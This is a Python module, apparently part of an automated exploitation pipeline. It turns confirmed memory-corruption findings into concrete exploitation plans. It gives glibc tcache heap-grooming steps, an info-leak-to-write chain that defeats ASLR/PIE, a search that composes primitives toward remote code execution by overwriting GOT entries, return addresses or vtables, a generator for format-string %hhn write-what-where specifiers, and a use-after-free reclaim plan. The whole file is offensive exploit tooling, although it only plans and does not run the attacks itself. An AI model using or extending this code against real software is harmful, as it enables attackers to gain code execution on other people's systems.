"""Advanced weaponization planners (TTPs 1-4) — compose confirmed primitives toward L3/RCE.

Confirmed findings top out at L1/L2/DoS; reaching a demonstrated L3 needs the exploitation TTPs
below. These are PLANNERS (pure, testable): given the primitives a run confirmed, they emit a
concrete, ordered exploitation plan and an honest feasibility verdict. They do not detonate; the
detonation stage consumes the plan. Grounded in the measured glibc-2.3x behaviour.

  TTP1 heap_groom_plan        -- allocation sequence to place a victim adjacent to an overflow.
  TTP2 leak_to_write_chain    -- compose an OOB-read leak with an OOB-write to defeat ASLR.
  TTP3 plan_rce               -- search a primitive graph for a composition reaching code exec.
  TTP4 fmt_write_what_where / uaf_reclaim_plan -- format-string and UAF weaponizers.
"""
from __future__ import annotations

from dataclasses import dataclass, field

from .weaponize_model import allocator_placement, MMAP_THRESHOLD


# ---- TTP1: heap grooming -------------------------------------------------------------------------
@dataclass
class GroomPlan:
    feasible: bool
    steps: list
    reason: str


def heap_groom_plan(overflow_size: int, victim_size: int, *, alignment: int = 16) -> GroomPlan:
    """A tcache/fastbin groom to place a `victim_size` object immediately after the overflowed
    `overflow_size` chunk, so a forward overflow corrupts the victim. Infeasible when the overflowed
    chunk is mmap-resident (no heap adjacency) or the sizes land in different size-classes."""
    place = allocator_placement(overflow_size, alignment=alignment)
    if place.region == "mmap":
        return GroomPlan(False, [], f"overflowed buffer is mmap-resident ({place.reason}); heap "
                                    f"grooming cannot place a victim adjacent -- needs mmap grooming + a leak")
    def binclass(sz):                                   # glibc tcache bin granularity (16B)
        return (sz + 15) // 16
    if binclass(overflow_size) != binclass(victim_size):
        # different bins: still groomable via the same bin if we request the victim at the overflow's
        # bin size; note the adjustment rather than failing.
        note = (f"victim requested at the overflow's bin size ({binclass(overflow_size)*16}B) so both "
                f"come from the same tcache bin")
    else:
        note = "same tcache bin"
    steps = [
        f"fill the target tcache bin: allocate several {binclass(overflow_size)*16}B chunks",
        "free two adjacent chunks A,B into tcache (LIFO)",
        "allocate the OVERFLOW object -> reuses A (hole), victim-to-be is B",
        f"allocate the VICTIM ({victim_size}B, {note}) -> reuses B, now adjacent after A",
        "trigger the overflow of A -> writes into B (the victim's header/fields)",
    ]
    return GroomPlan(True, steps, f"heap-resident, {note}")


# ---- TTP2: info-leak -> write chaining (ASLR defeat) --------------------------------------------
@dataclass
class ExploitChain:
    stages: list
    defeats: list
    verdict: str


def leak_to_write_chain(leak: dict, write: dict) -> ExploitChain:
    """Compose an OOB-READ (info-leak) finding with an OOB-WRITE finding: stage 1 discloses a pointer
    to beat ASLR, stage 2 uses the resolved address as the write target. `leak`/`write` are finding
    dicts with at least {cwe, function}."""
    leak_ok = (leak.get("cwe") in ("CWE-125", "CWE-200", "CWE-126"))
    write_ok = (write.get("cwe") in ("CWE-787", "CWE-122", "CWE-120", "CWE-416", "CWE-190"))
    if not (leak_ok and write_ok):
        return ExploitChain([], [], "need an OOB-read leak AND an OOB-write primitive to chain")
    stages = [
        f"stage 1 (leak): drive {leak.get('function','the OOB read')} to disclose a code/libc pointer",
        "resolve the module base from the leaked pointer (defeat PIE/ASLR)",
        f"stage 2 (write): drive {write.get('function','the OOB write')} with the resolved target "
        f"(GOT entry / saved return / callback pointer) -> control transfer",
    ]
    return ExploitChain(stages, ["ASLR/PIE (via the leak)"], "chain is sound given both primitives confirmed")


# ---- TTP3: primitive-graph search to RCE ---------------------------------------------------------
#: what each primitive provides -> what RCE needs. A path through these reaches code execution.
_RCE_NEEDS = {"leak", "write-what-where"}


def plan_rce(primitives: list) -> dict:
    """Search the set of confirmed primitives for a composition reaching code execution, and pick a
    target. `primitives` is a list of tags from {'oob-read','oob-write','uaf','arbitrary-free',
    'leak','fmt'}. Honest: returns the chain or names exactly what is still missing."""
    prims = set(primitives)
    have_leak = bool(prims & {"oob-read", "leak", "fmt"})
    have_write = bool(prims & {"oob-write", "write-what-where", "fmt"}) or \
        bool(prims & {"uaf", "arbitrary-free"})         # a UAF/free -> controlled write via reclaim
    targets = ["saved return address (stack)", "a GOT/PLT entry", "a heap vtable/callback pointer"]
    if have_leak and have_write:
        return {"reachable": True, "target": targets,
                "chain": ["leak a pointer -> defeat ASLR", "convert the write primitive to "
                          "write-what-where", "overwrite a code pointer with a controlled target",
                          "trigger the call -> RCE"],
                "needs": []}
    missing = []
    if not have_leak:
        missing.append("an information leak (OOB read / format read) to defeat ASLR")
    if not have_write:
        missing.append("a controlled write (OOB write / UAF-reclaim / format %n)")
    return {"reachable": False, "target": targets, "chain": [], "needs": missing}


# ---- TTP4: format-string & UAF weaponizers -------------------------------------------------------
def fmt_write_what_where(target_addr: int, value: int, *, arg_index: int = 1) -> dict:
    """A format-string (%n) write-what-where plan: write `value` to `target_addr` via staged %n,
    cheapest as byte-wise %hhn writes. Returns the writes and the conceptual payload shape."""
    writes = []
    for b in range(0, 32, 8):
        byte = (value >> b) & 0xFF
        writes.append({"addr": target_addr + (b // 8), "byte": byte,
                       "spec": f"%{byte if byte else 256}c%{arg_index}$hhn"})
    return {"primitive": "write-what-where via %n", "target": hex(target_addr),
            "value": hex(value), "writes": writes,
            "note": "place the target addresses in the stack arg area; byte-wise %hhn avoids huge widths"}


def uaf_reclaim_plan(freed_size: int, controlled_bytes: int) -> dict:
    """Plan to turn a UAF into control: reclaim the freed object with attacker bytes, then trigger the
    use (a vtable/callback call through the reclaimed object)."""
    enough = controlled_bytes >= freed_size
    return {"feasible": enough,
            "steps": [
                f"after the free, allocate an attacker-controlled object of the same size "
                f"({freed_size}B) to reclaim the freed chunk (tcache LIFO returns it)",
                f"fill it with {controlled_bytes}B of attacker data (a fake vtable / callback table)",
                "trigger the dangling use -> calls through the attacker-controlled pointer",
            ] if enough else [],
            "reason": ("reclaim fits the freed chunk" if enough else
                       f"only {controlled_bytes}B controllable < {freed_size}B object; cannot fully "
                       f"reclaim -- need a larger controlled allocation at this size class")}
